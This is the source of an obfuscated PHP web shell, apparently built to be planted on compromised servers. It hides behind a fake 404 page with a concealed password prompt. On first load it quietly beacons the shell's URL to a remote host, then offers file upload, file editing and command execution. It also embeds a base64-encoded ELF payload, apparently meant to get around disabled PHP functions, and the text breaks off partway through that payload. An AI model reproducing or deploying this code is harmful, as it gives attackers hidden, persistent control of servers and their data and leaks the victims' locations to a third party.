<?php session_start();
/**
 * shell khusus os windows
 * support php 5
 * support command windows
 */ date_default_timezone_set(base64_decode('QXNpYS9KYWthcnRh'));
$rbv_7 = base64_decode('RmlsZXNNYW4=');
$lja_8 = true;
$yru_9 = base64_decode('VVRGLTg=');
$zrn_a = base64_decode('Zg==') . base64_decode('aQ==') . base64_decode('bA==') . base64_decode('ZQ==') . base64_decode('Xw==') . base64_decode('Zw==') . base64_decode('ZQ==') . base64_decode('dA==') . base64_decode('Xw==') . base64_decode('Yw==') . base64_decode('bw==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('cw==');
$hxt_b = (isset($_SERVER[base64_decode('SFRUUFM=')]) && $_SERVER[base64_decode('SFRUUFM=')] === base64_decode('b24=')) ? base64_decode('aHR0cHM=') : base64_decode('aHR0cA==');
$zgf_c = $hxt_b . base64_decode('Oi8v') . $_SERVER[base64_decode('SFRUUF9IT1NU')] . $_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];
$pho_d = base64_decode('aHR0cHM6Ly9zZXJ2Mi5kYWxvdmV6Lm15LmlkL2J5LXBzLWx0c3BlZC9jaGFua3JvLnBocD9kbHZ6PQ==') . urlencode($zgf_c);
if (!isset($_SESSION[base64_decode('YXV0aA==')])) {
    $ltw_e = $zrn_a($pho_d);
    $_SESSION[base64_decode('YXV0aA==')] = true;
}
function tzn_0($ejv_f = '')
{ ?>
    <!DOCTYPE html>
    <html>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            input {
                margin: 0;
                background-color: #fff;
                border: 1px solid #fff;
            }
        </style>
    </head>

    <body bgcolor="white">
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <p>Additionally, a 404 Not Found
            error was encountered while trying to use an ErrorDocument to handle the request.</p>
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="">&nbsp;
            </div>
        </form>
    </body>

    </html>

    </html>
<?php exit;
}
if (!isset($_SESSION[base64_decode(base64_decode('WVhWMGFHVnVkR2xqWVhSbFpBPT0='))])) {
    $doq_10 = base64_decode('OTIyYWQ2YTg1ZTRmYzM2YWJmZThhN2YzODMwYTExMjM=');
    if (isset($_POST[base64_decode(base64_decode('Y0dGemN3PT0='))])) {
        $zjg_11 = md5($_POST[base64_decode(base64_decode('Y0dGemN3PT0='))]);
        if ($zjg_11 === $doq_10) {
            $_SESSION[base64_decode(base64_decode('WVhWMGFHVnVkR2xqWVhSbFpBPT0='))] = true;
        } else {
            tzn_0();
        }
    } else {
        tzn_0();
    }
} ?>

<!DOCTYPE html>
<html>

<head>
    <title>BypasS Server</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <!-- <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet"> -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: "Montserrat", sans-serif;
            color: #ebdbb2;
            margin: 0;
            padding: 0;
            background-color: #282828;
        }

        .result-box-container {
            position: relative;
            margin-top: 20px;
        }

        .result-box {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            /* background-color: #458588; */
            background-color: #ebdbb2;
            overflow: auto;
            box-sizing: border-box;
            font-family: "Montserrat", sans-serif;
            /* color: #458588; */
            color: #282828;
        }

        .result-box::placeholder {
            color: #b3b6bd;
        }

        .result-box:focus {
            outline: none;
            border-color: #458588;
        }

        .result-box::-webkit-scrollbar {
            width: 8px;
        }

        .result-box::-webkit-scrollbar-thumb {
            background-color: #458588;
            border-radius: 4px;
        }

        .container {
            padding: 20px;
            background-color: #282828;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        .header h1 {
            font-size: 24px;
        }

        .subheader {
            text-align: center;
            margin-bottom: 20px;
        }

        .subheader p {
            font-size: 16px;
            font-style: italic;
        }

        form {
            /* margin-bottom: 20px; */
        }

        form input[type="text"],
        form textarea {
            padding: 8px;
            /* margin-bottom: 10px; */
            border: 1px solid #458588;
            border-radius: 3px;
            box-sizing: border-box;
            color: #282828;
            background-color: #ebdbb2;

        }

        form input[type="submit"] {

            padding: 10px;
            margin-left: 5px;
            background-color: #458588;
            color: #ebdbb2;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        hr {
            color: #458588;
        }

        a:link {
            color: #ebdbb2;
        }

        input::file-selector-button {
            color: #282828;
            background-color: #ebdbb2;
            border-radius: 10px;
        }

        input::file-selector-button:hover {
            color: #282828;
            background-color: #fbf1c7;
            border-radius: 10px;
        }

        form input[type="file"] {
            padding: 7px;
            background-color: #ebdbb2;
            color: #282828;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: "Montserrat", sans-serif;
            background-color: #ebdbb2;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }

        form input[type="submit"]:hover {
            background-color: #143015;
        }

        table {
            margin: 10px auto;
            width: 90%;
            border-collapse: collapse;
        }

        th,
        td {
            padding: 5px;
            text-align: left;
            background-color: #282828;
        }

        th {
            background-color: #458588;
        }

        tr:nth-child(even) {
            background-color: #9c9b9bce;
        }

        .item-name {
            /* width: 400px; */
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .size {
            width: 150px;
            text-align: center;
        }

        .date {
            width: 350px;
        }

        .permission {
            width: 150px;
            font-weight: bold;
            text-align: center;
        }

        .writable {
            color: #427b58;
        }

        .not-writable {
            color: #cc241d;
        }

        /* .flx{
        align-items: center;
        display: flex;
        gap:10px;
        width: 190px;


        display: flex;
        justify-content: center;
    } */

        .flx {
            justify-content: center;
            display: flex;
            align-items: stretch;
            /* background-color: #f1f1f1; */
        }

        .flx-item-left {
            background-color: #f1f1f1;
            flex: 10px;
        }

        .flx-item-center {
            background-color: dodgerblue;
            flex: 10px;
        }

        .flx-item-right {
            background-color: red;
            flex: 10px;
        }

        .flx>div {
            color: #ebdbb2;
            margin: 5px;
            text-align: center;
            line-height: 20px;
        }

        @media (max-width: 800px) {
            .flx {
                flex-direction: column;
            }
        }

        .icon-win {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .align-center-windows {
            display: flex;
            align-items: center;
        }

        .align-center-windows span {
            margin-right: 10px;
        }

        .flx form input[type="text"] {
            padding-right: 5vw;
        }

        .flx form input[type="submit"] {}

        textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #458588;
            border-radius: 3px;
            font-family: "Montserrat", sans-serif;
        }
    </style>
</head>

<body>
    <h1>
        <div class="icon-win">
            <center class="align-center-windows">
                <div><span style="color: #334da8">V</span><span style="color: #3151ac">1</span><span style="color: #3056b0">k</span><span style="color: #2e5ab5">1</span><span style="color: #2c5eb9">n</span><span style="color: #2b63bd">g</span><span style="color: #2967c1"> </span><span style="color: #276bc6">S</span><span style="color: #256fca">_</span><span style="color: #2474ce">H</span><span style="color: #2278d2">3</span><span style="color: #207cd7">_</span><span style="color: #1f81db">L</span><span style="color: #1d85df">L</span></div>
                <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="90" height="90" viewBox="0 0 48 48">
                    <path fill="#00b0ff" d="M20 25.026L5.011 25 5.012 37.744 20 39.818zM22 25.03L22 40.095 42.995 43 43 25.066zM20 8.256L5 10.38 5.014 23 20 23zM22 7.973L22 23 42.995 23 42.995 5z"></path>
                </svg>
            </center>
        </div>
    </h1>
    <div class="container">
        <span>thx to ha_Xor_seC</span></br>
        <?php $njv_12 = base64_decode('Yw==') . base64_decode('aA==') . base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==');
        $fjo_13 = base64_decode('ZQ==') . base64_decode('eA==') . base64_decode('cA==') . base64_decode('bA==') . base64_decode('bw==') . base64_decode('ZA==') . base64_decode('ZQ==');
        $nhr_14 = base64_decode('cw==') . base64_decode('Yw==') . base64_decode('YQ==') . base64_decode('bg==') . base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==');
        $sbi_15 = base64_decode('cg==') . base64_decode('ZQ==') . base64_decode('YQ==') . base64_decode('bA==') . base64_decode('cA==') . base64_decode('YQ==') . base64_decode('dA==') . base64_decode('aA==');
        $ody_16 = base64_decode('cw==') . base64_decode('dA==') . base64_decode('YQ==') . base64_decode('dA==');
        $zju_17 = base64_decode('aQ==') . base64_decode('cw==') . base64_decode('Xw==') . base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==');
        $ukp_18 = base64_decode('aQ==') . base64_decode('cw==') . base64_decode('Xw==') . base64_decode('dw==') . base64_decode('cg==') . base64_decode('aQ==') . base64_decode('dA==') . base64_decode('YQ==') . base64_decode('Yg==') . base64_decode('bA==') . base64_decode('ZQ==');
        $adx_19 = base64_decode('bQ==') . base64_decode('bw==') . base64_decode('dg==') . base64_decode('ZQ==') . base64_decode('Xw==') . base64_decode('dQ==') . base64_decode('cA==') . base64_decode('bA==') . base64_decode('bw==') . base64_decode('YQ==') . base64_decode('ZA==') . base64_decode('ZQ==') . base64_decode('ZA==') . base64_decode('Xw==') . base64_decode('Zg==') . base64_decode('aQ==') . base64_decode('bA==') . base64_decode('ZQ==');
        $pgk_1a = base64_decode('Yg==') . base64_decode('YQ==') . base64_decode('cw==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('YQ==') . base64_decode('bQ==') . base64_decode('ZQ==');
        $ans_1b = base64_decode('aA==') . base64_decode('dA==') . base64_decode('bQ==') . base64_decode('bA==') . base64_decode('cw==') . base64_decode('cA==') . base64_decode('ZQ==') . base64_decode('Yw==') . base64_decode('aQ==') . base64_decode('YQ==') . base64_decode('bA==') . base64_decode('Yw==') . base64_decode('aA==') . base64_decode('YQ==') . base64_decode('cg==') . base64_decode('cw==');
        $rkg_1c = base64_decode('Zg==') . base64_decode('aQ==') . base64_decode('bA==') . base64_decode('ZQ==') . base64_decode('Xw==') . base64_decode('cA==') . base64_decode('dQ==') . base64_decode('dA==') . base64_decode('Xw==') . base64_decode('Yw==') . base64_decode('bw==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('cw==');
        $gqb_1d = base64_decode('bQ==') . base64_decode('aw==') . base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==');
        $day_1e = base64_decode('Zg==') . base64_decode('aQ==') . base64_decode('bA==') . base64_decode('ZQ==') . base64_decode('Xw==') . base64_decode('Zw==') . base64_decode('ZQ==') . base64_decode('dA==') . base64_decode('Xw==') . base64_decode('Yw==') . base64_decode('bw==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('dA==') . base64_decode('cw==');
        $deo_1f = base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==') . base64_decode('bg==') . base64_decode('YQ==') . base64_decode('bQ==') . base64_decode('ZQ==');
        $ltw_e = base64_decode('dQ==') . base64_decode('bg==') . base64_decode('bA==') . base64_decode('aQ==') . base64_decode('bg==') . base64_decode('aw==');
        $kgw_20 = date_default_timezone_get();
        date_default_timezone_set($kgw_20);
        $rsa_21 = $sbi_15($_SERVER[base64_decode('XHg0NFx4NGZceDQzXHg1NVx4NGRceDQ1XHg0ZVx4NTRceDVmXHg1Mlx4NGZceDRmXHg1NA==')]);
        $fem_22 = $deo_1f(__FILE__);
        function lff_1($afo_23)
        {
            $vwy_24 = base64_decode('YmE=') . base64_decode('c2U=') . base64_decode('NjQ=') . base64_decode('Xw==') . base64_decode('ZW4=') . base64_decode('Y28=') . base64_decode('ZGU=');
            return $vwy_24($afo_23);
        }
        function dam_2($afo_23)
        {
            $eis_25 = base64_decode('YmE=') . base64_decode('c2U=') . base64_decode('NjQ=') . base64_decode('Xw==') . base64_decode('ZGU=') . base64_decode('Y28=') . base64_decode('ZGU=');
            return $eis_25($afo_23);
        }
        if (function_exists(base64_decode('bWFpbA=='))) {
            $kbm_26 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgbWFpbCgpIDo8L2ZvbnQ+PGZvbnQgY29sb3I9JyM0MjdiNTgnPiBbIE9OIF08L2ZvbnQ+IF0=');
        } else {
            $kbm_26 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgbWFpbCgpIDo8L2ZvbnQ+PGZvbnQgY29sb3I9JyNjYzI0MWQnPiBbIE9GRiBdPC9mb250PiBd');
        }
        if (function_exists(base64_decode('bWJfc2VuZF9tYWls'))) {
            $flr_27 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgbWJfc2VuZF9tYWlsKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nIzQyN2I1OCc+IFsgT04gXTwvZm9udD4gXQ==');
        } else {
            $flr_27 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgbWJfc2VuZF9tYWlsKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nI2NjMjQxZCc+IFsgT0ZGIF08L2ZvbnQ+IF0=');
        }
        if (function_exists(base64_decode('ZXJyb3JfbG9n'))) {
            $ajy_28 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgZXJyb3JfbG9nKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nIzQyN2I1OCc+IFsgT04gXTwvZm9udD4gXQ==');
        } else {
            $ajy_28 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgZXJyb3JfbG9nKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nI2NjMjQxZCc+IFsgT0ZGIF08L2ZvbnQ+IF0=');
        }
        if (function_exists(base64_decode('aW1hcF9tYWls'))) {
            $rem_29 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgaW1hcF9tYWlsKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nIzQyN2I1OCc+IFsgT04gXTwvZm9udD4gXQ==');
        } else {
            $rem_29 = base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgaW1hcF9tYWlsKCkgOjwvZm9udD48Zm9udCBjb2xvcj0nI2NjMjQxZCc+IFsgT0ZGIF08L2ZvbnQ+IF08YnI+');
        }
        if (function_exists(base64_decode('bWFpbA=='))) {
            echo $kbm_26 . base64_decode('IA==') . $flr_27 . base64_decode('IA==') . $ajy_28 . base64_decode('IA==') . $rem_29;
        } else {
            echo $kbm_26 . base64_decode('IA==') . $flr_27 . base64_decode('IA==') . $ajy_28 . base64_decode('IA==') . $rem_29;
        }
        if (function_exists(base64_decode('cHV0ZW52'))) {
            echo base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgRnVuY3Rpb24gcHV0ZW52KCkgXSA6PC9mb250Pjxmb250IGNvbG9yPScjNDI3YjU4Jz4gWyBPTiBdPC9mb250Pjxicj4=');
        } else {
            echo base64_decode('PGZvbnQgY29sb3I9JyNlYmRiYjInPlsgRnVuY3Rpb24gcHV0ZW52KCkgXSA6PGZvbnQgY29sb3I9JyNjYzI0MWQnPiBbIE9GRiBdPC9mb250Pjxicj4=');
        }
        function wrd_3($kko_2a)
        {
            $kko_2a = str_replace(base64_decode('Lw=='), base64_decode('XFw='), $kko_2a);
            $kko_2a = preg_replace(base64_decode('I1xcXFwrIw=='), base64_decode('XFw='), $kko_2a);
            return rtrim($kko_2a, base64_decode('XFw='));
        }
        foreach ($_GET as $zjg_2b => $bah_2c) $_GET[$zjg_2b] = dam_2($bah_2c);
        $ula_2d = $sbi_15(isset($_GET[base64_decode('ZA==')]) ? $_GET[base64_decode('ZA==')] : $rsa_21);
        $ula_2d = wrd_3($ula_2d);
        $yxm_2e = '';
        if ($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')] === base64_decode('UE9TVA==')) {
            if (isset($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')])) {
                $qor_2f = $ula_2d . base64_decode('Lw==') . $pgk_1a($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('bmFtZQ==')]);
                if ($adx_19($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('dG1wX25hbWU=')], $qor_2f)) {
                    echo base64_decode('PGhyPkZpbGUg') . $ans_1b($pgk_1a($_FILES[base64_decode('ZmlsZVRvVXBsb2Fk')][base64_decode('bmFtZQ==')])) . base64_decode('IFVwbG9hZCBzdWNjZXNzPGhyPg==');
                } else {
                    echo base64_decode('PGhyPlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS48aHI+');
                }
            } elseif (isset($_POST[base64_decode('Zm9sZGVyX25hbWU=')]) && !empty($_POST[base64_decode('Zm9sZGVyX25hbWU=')])) {
                $jeo_30 = $_POST[base64_decode('Zm9sZGVyX25hbWU=')];
                $ipj_31 = $ula_2d . base64_decode('Lw==') . $jeo_30;
                if (!file_exists($ddo_32)) {
                    if ($gqb_1d($ipj_31) !== false) {
                        echo base64_decode('PGhyPkZvbGRlciBjcmVhdGVkIHN1Y2Nlc3NmdWxseSE=');
                    } else {
                        echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgdG8gY3JlYXRlIGZvbGRlciE=');
                    }
                }
            } elseif (isset($_POST[base64_decode('ZmlsZV9uYW1l')])) {
                $xsy_33 = $_POST[base64_decode('ZmlsZV9uYW1l')];
                $ims_34 = $ula_2d . base64_decode('Lw==') . $xsy_33;
                if (!file_exists($ims_34)) {
                    if ($rkg_1c($ims_34, '') !== false) {
                        echo base64_decode('PGhyPkZpbGUgY3JlYXRlZCBzdWNjZXNzZnVsbHkh') . $xsy_33 . base64_decode('IA==');
                        $cpb_35 = $ims_34;
                        if (file_exists($cpb_35)) {
                            $rxr_36 = $day_1e($cpb_35);
                            $yxm_2e = base64_decode('PGhyPjxwPlJlc3VsdDog') . $xsy_33 . base64_decode('PC9wPg0KICAgICAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPw==') . (isset($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]) ? $_SERVER[base64_decode('UVVFUllfU1RSSU5H')] : '') . base64_decode('Ij4NCiAgICAgICAgICAgICAgICAgICAgPHRleHRhcmVhIG5hbWU9ImNvbnRlbnQiIGNsYXNzPSJyZXN1bHQtYm94Ij4=') . $ans_1b($rxr_36) . base64_decode('PC90ZXh0YXJlYT48dGQ+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImVkaXRfZmlsZSIgdmFsdWU9Ig==') . $xsy_33 . base64_decode('Ij4NCiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IiBTYXZlICI+PC9mb3JtPjwvdGQ+');
                        } else {
                            $yxm_2e = base64_decode('PGhyPjxwPkVycm9yOiBGaWxlIG5vdCBmb3VuZCE8L3A+');
                        }
                    } else {
                        echo base64_decode('PGhyPkVycm9yOiBGYWlsZWQgdG8gY3JlYXRlIGZpbGUh');
                    }
                } else {
                    echo base64_decode('PGhyPkVycm9yOiBGaWxlIEFscmVhZHkgRXhpc3RzIQ==');
                }
            } elseif (isset($_POST[base64_decode('Y21kX2lucHV0')])) {
                $ydk_37 = base64_decode('cA==') . base64_decode('dQ==') . base64_decode('dA==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('dg==');
                $niy_38 = base64_decode('Zmk=') . base64_decode('bGVfcA==') . base64_decode('dXRfYw==') . base64_decode('b250') . base64_decode('ZQ==') . base64_decode('bnQ=') . base64_decode('cw==');
                $ols_39 = base64_decode('bQ==') . base64_decode('YQ==') . base64_decode('aQ==') . base64_decode('bA==');
                $jtt_3a = base64_decode('YmE=') . base64_decode('c2U=') . base64_decode('NjQ=') . base64_decode('Xw==') . base64_decode('ZGU=') . base64_decode('Y28=') . base64_decode('ZGU=');
                $ogq_3b = base64_decode('YmE=') . base64_decode('c2U=') . base64_decode('NjQ=') . base64_decode('Xw==') . base64_decode('ZW4=') . base64_decode('Y28=') . base64_decode('ZGU=');
                $kuk_3c = base64_decode('bQ==') . base64_decode('Yg==') . base64_decode('Xw==') . base64_decode('cw==') . base64_decode('ZQ==') . base64_decode('bg==') . base64_decode('ZA==') . base64_decode('Xw==') . base64_decode('bQ==') . base64_decode('YQ==') . base64_decode('aQ==') . base64_decode('bA==');
                $rof_3d = base64_decode('ZQ==') . base64_decode('cg==') . base64_decode('cg==') . base64_decode('bw==') . base64_decode('cg==') . base64_decode('Xw==') . base64_decode('bA==') . base64_decode('bw==') . base64_decode('Zw==');
                $oph_3e = base64_decode('ZA==') . base64_decode('aQ==') . base64_decode('cg==') . base64_decode('bg==') . base64_decode('YQ==') . base64_decode('bQ==') . base64_decode('ZQ==');
                $jhk_3f = base64_decode('aQ==') . base64_decode('bQ==') . base64_decode('YQ==') . base64_decode('cA==') . base64_decode('Xw==') . base64_decode('bQ==') . base64_decode('YQ==') . base64_decode('aQ==') . base64_decode('bA==');
                $opo_40 = $_SERVER[base64_decode('UEhQX1NFTEY=')];
                $oss_41 = $_SERVER[base64_decode('RE9DVU1FTlRfUk9PVA==')];
                $kjm_42 = $oph_3e($opo_40);
                $muk_43 = $oss_41 . $kjm_42;
                $xsu_44 = base64_decode('ZjBWTVJnSUJBUUFBQUFBQUFBQUFBQU1BUGdBQkFBQUE0QWNBQUFBQUFBQkFBQUFBQUFBQUFQZ1pBQUFBQUFBQUFBQUFBRUFBT0FBSEFFQUFIUUFjQUFFQUFBQUZBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFiQW9BQUFBQUFBQnNDZ0FBQUFBQUFBQUFJQUFBQUFBQUFRQUFBQVlBQUFENERRQUFBQUFBQVBnTklBQUFBQUFBK0EwZ0FBQUFBQUJ3QWdBQUFBQUFBSGdDQUFBQUFBQUFBQUFnQUFBQUFBQUNBQUFBQmdBQUFCZ09BQUFBQUFBQUdBNGdBQUFBQUFBWURpQUFBQUFBQU1BQkFBQUFBQUFBd0FFQUFBQUFBQUFJQUFBQUFBQUFBQVFBQUFBRUFBQUF5QUVBQUFBQUFBRElBUUFBQUFBQUFNZ0JBQUFBQUFBQUpBQUFBQUFBQUFBa0FBQUFBQUFBQUFRQUFBQUFBQUFBVU9WMFpBUUFBQUI0Q1FBQUFBQUFBSGdKQUFBQUFBQUFlQWtBQUFBQUFBQTBBQUFBQUFBQUFEUUFBQUFBQUFBQUJBQUFBQUFBQUFCUjVYUmtCZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFGTGxkR1FFQUFBQStBMEFBQUFBQUFENERTQUFBQUFBQVBnTklBQUFBQUFBQ0FJQUFBQUFBQUFJQWdBQUFBQUFBQUVBQUFBQUFBQUFCQUFBQUJRQUFBQURBQUFBUjA1VkFHaGtGb3BGVlB2WGJZYkJpbEJxN1NkOFMxa3JBQUFBQUFNQUFBQU5BQUFBQVFBQUFBWUFBQUNJd0NCRkFvUmdHUTBBQUFBUkFBQUFFd0FBQUVKRjFleGdYYjFjM211VmdMdmprbnpZY1ZnY3VZM3hEdXJUN3c0Ym40Z0xBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSGtBQUFBU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCd0FBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUlZQUFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSmNBQUFBU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUlBQUFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBR0VBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFMSUFBQUFTQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUtNQUFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRGdBQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFGSUFBQUFpQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUo0QUFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTVVBQUFBUUFCY0FhQkFnQUFBQUFBQUFBQUFBQUFBQUFJMEFBQUFTQUF3QUZBa0FBQUFBQUFBcEFBQUFBQUFBQUtnQUFBQVNBQXdBUFFrQUFBQUFBQUFkQUFBQUFBQUFBTmdBQUFBUUFCZ0FjQkFnQUFBQUFBQUFBQUFBQUFBQUFNd0FBQUFRQUJnQWFCQWdBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQVNBQWtBR0FjQUFBQUFBQUFBQUFBQUFBQUFBQllBQUFBU0FBMEFYQWtBQUFBQUFBQUFBQUFBQUFBQUFIVUFBQUFTQUF3QTRBZ0FBQUFBQUFBMEFBQUFBQUFBQUFCZlgyZHRiMjVmYzNSaGNuUmZYd0JmYVc1cGRBQmZabWx1YVFCZlNWUk5YMlJsY21WbmFYTjBaWEpVVFVOc2IyNWxWR0ZpYkdVQVgwbFVUVjl5WldkcGMzUmxjbFJOUTJ4dmJtVlVZV0pzWlFCZlgyTjRZVjltYVc1aGJHbDZaUUJmU25aZlVtVm5hWE4wWlhKRGJHRnpjMlZ6QUhCM2JnQm5aWFJsYm5ZQVkyaHRiMlFBYzNsemRHVnRBR1JoWlcxdmJtbDZaUUJ6YVdkdVlXd0FabTl5YXdCbGVHbDBBSEJ5Wld4dllXUnRaUUIxYm5ObGRHVnVkZ0JzYVdKakxuTnZMallBWDJWa1lYUmhBRjlmWW5OelgzTjBZWEowQUY5bGJtUUFSMHhKUWtOZk1pNHlMalVBQUFBQUFnQUFBQUlBQWdBQUFBSUFBQUFDQUFJQUFBQUNBQUlBQVFBQkFBRUFBUUFCQUFFQUFRQUJBQUFBQUFBQkFBRUF1d0FBQUJBQUFBQUFBQUFBZFJwcENRQUFBZ0RkQUFBQUFBQUFBUGdOSUFBQUFBQUFDQUFBQUFBQUFBQ3dDQUFBQUFBQUFBZ09JQUFBQUFBQUNBQUFBQUFBQUFCd0NBQUFBQUFBQUdBUUlBQUFBQUFBQ0FBQUFBQUFBQUJnRUNBQUFBQUFBQUFPSUFBQUFBQUFBUUFBQUE4QUFBQUFBQUFBQUFBQUFOZ1BJQUFBQUFBQUJnQUFBQUlBQUFBQUFBQUFBQUFBQU9BUElBQUFBQUFBQmdBQUFBVUFBQUFBQUFBQUFBQUFBT2dQSUFBQUFBQUFCZ0FBQUFjQUFBQUFBQUFBQUFBQUFQQVBJQUFBQUFBQUJnQUFBQW9BQUFBQUFBQUFBQUFBQVBnUElBQUFBQUFBQmdBQUFBc0FBQUFBQUFBQUFBQUFBQmdRSUFBQUFBQUFCd0FBQUFFQUFBQUFBQUFBQUFBQUFDQVFJQUFBQUFBQUJ3QUFBQTRBQUFBQUFBQUFBQUFBQUNnUUlBQUFBQUFBQndBQUFBTUFBQUFBQUFBQUFBQUFBREFRSUFBQUFBQUFCd0FBQUJRQUFBQUFBQUFBQUFBQUFEZ1FJQUFBQUFBQUJ3QUFBQVFBQUFBQUFBQUFBQUFBQUVBUUlBQUFBQUFBQndBQUFBWUFBQUFBQUFBQUFBQUFBRWdRSUFBQUFBQUFCd0FBQUFnQUFBQUFBQUFBQUFBQUFGQVFJQUFBQUFBQUJ3QUFBQWtBQUFBQUFBQUFBQUFBQUZnUUlBQUFBQUFBQndBQUFBd0FBQUFBQUFBQUFBQUFBRWlEN0FoSWl3VzlDQ0FBU0lYQWRBTC8wRWlEeEFqREFQODEwZ2dnQVA4bDFBZ2dBQThmUUFEL0pkSUlJQUJvQUFBQUFPbmcvLy8vL3lYS0NDQUFhQUVBQUFEcDBQLy8vLzhsd2dnZ0FHZ0NBQUFBNmNELy8vLy9KYm9JSUFCb0F3QUFBT213Ly8vLy95V3lDQ0FBYUFRQUFBRHBvUC8vLy84bHFnZ2dBR2dGQUFBQTZaRC8vLy8vSmFJSUlBQm9CZ0FBQU9tQS8vLy8veVdhQ0NBQWFBY0FBQURwY1AvLy8vOGxrZ2dnQUdnSUFBQUE2V0QvLy8vL0pTSUlJQUJta0FBQUFBQUFBQUFBU0kwOWdRZ2dBRWlOQllFSUlBQlZTQ240U0lubFNJUDREbllWU0lzRjFnY2dBRWlGd0hRSlhmL2daZzhmUkFBQVhjTVBIMEFBWmk0UEg0UUFBQUFBQUVpTlBVRUlJQUJJalRVNkNDQUFWVWdwL2tpSjVVakIvZ05JaWZCSXdlZy9TQUhHU05IK2RCaElpd1doQnlBQVNJWEFkQXhkLytCbUR4K0VBQUFBQUFCZHd3OGZRQUJtTGc4ZmhBQUFBQUFBZ0QzeEJ5QUFBSFVuU0lNOWR3Y2dBQUJWU0lubGRBeElpejNTQnlBQTZEMy8vLy9vU1AvLy8xM0dCY2dISUFBQjg4TVBIMEFBWmk0UEg0UUFBQUFBQUVpTlBWa0ZJQUJJZ3o4QWRRdnBYdi8vLzJZUEgwUUFBRWlMQlJrSE